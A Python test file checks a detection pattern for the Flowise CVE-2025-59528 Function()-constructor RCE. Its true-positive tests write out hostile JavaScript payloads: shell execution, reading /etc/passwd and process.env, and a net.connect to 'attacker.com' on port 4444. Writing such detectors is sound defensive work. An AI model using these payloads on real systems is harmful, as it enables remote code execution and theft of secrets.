"""Tests for incident-postmortem-derived detection patterns (cycle 9, pass 3).

Covers:
- sc_flowise_js_rce  (Flowise CVE-2025-59528, CVSS 10.0: Function() constructor RCE via MCP config)
"""

from aigis.filters.patterns import SUPPLY_CHAIN_PATTERNS


def _get_supply(rule_id: str):
    for p in SUPPLY_CHAIN_PATTERNS:
        if p.id == rule_id:
            return p
    raise KeyError(f"Pattern {rule_id!r} not found in SUPPLY_CHAIN_PATTERNS")


# ---------------------------------------------------------------------------
# sc_flowise_js_rce — CVE-2025-59528
# ---------------------------------------------------------------------------


class TestFlowiseJsRce:
    def setup_method(self):
        self.pat = _get_supply("sc_flowise_js_rce")

    # True positives — Function() constructor with dangerous Node.js modules
    def test_new_function_child_process_detected(self):
        payload = 'new Function(\'return require("child_process").execSync("id")\')() '
        assert self.pat.pattern.search(payload)

    def test_new_function_execsync_detected(self):
        assert self.pat.pattern.search("new Function('code', 'return execSync(cmd)')() ")

    def test_new_function_spawnsync_detected(self):
        assert self.pat.pattern.search('new Function(\'return spawnSync("ls", ["-la"])\')()')

    def test_new_function_fs_module_detected(self):
        assert self.pat.pattern.search(
            'new Function(\'return require("fs").readFileSync("/etc/passwd")\')() '
        )

    def test_new_function_process_env_detected(self):
        assert self.pat.pattern.search("new Function('return JSON.stringify(process.env)')()")

    def test_new_function_net_module_detected(self):
        assert self.pat.pattern.search(
            'new Function(\'return require("net").connect(4444,"attacker.com")\')() '
        )

    def test_function_prototype_constructor_detected(self):
        assert self.pat.pattern.search(
            "[].constructor.constructor('return process.env')()"
            # alternate spelling the pattern must also catch:
        ) or self.pat.pattern.search("Function.prototype.constructor('alert(1)')")

    # True positives — dangerous pattern inside mcpServerConfig field
    def test_mcp_server_config_eval_detected(self):
        payload = 'mcpServerConfig: "eval(userInput)"'
        assert self.pat.pattern.search(payload)

    def test_mcp_server_config_new_function_detected(self):
        payload = 'mcpServerConfig: "new Function(code)()"'
        assert self.pat.pattern.search(payload)

    def test_mcp_command_child_process_detected(self):
        payload = "\"command\": \"require('child_process').exec('id')\""
        assert self.pat.pattern.search(payload)

    # True negatives — legitimate mentions that should NOT fire
    def test_discussion_of_function_constructor_benign(self):
        # Educational text that doesn't combine with dangerous modules
        assert not self.pat.pattern.search(
            "The Function() constructor is a JavaScript built-in that creates function objects."
        )

    def test_json5_parse_benign(self):
        assert not self.pat.pattern.search(
            "The fix replaced Function() with JSON5.parse() to safely parse config."
        )

    def test_safe_new_function_no_modules_benign(self):
        # new Function() without dangerous module references should not trigger
        assert not self.pat.pattern.search("new Function('x', 'return x + 1')(5)")

    def test_require_in_prose_benign(self):
        assert not self.pat.pattern.search(
            "You can require the child_process module in Node.js for OS commands."
        )
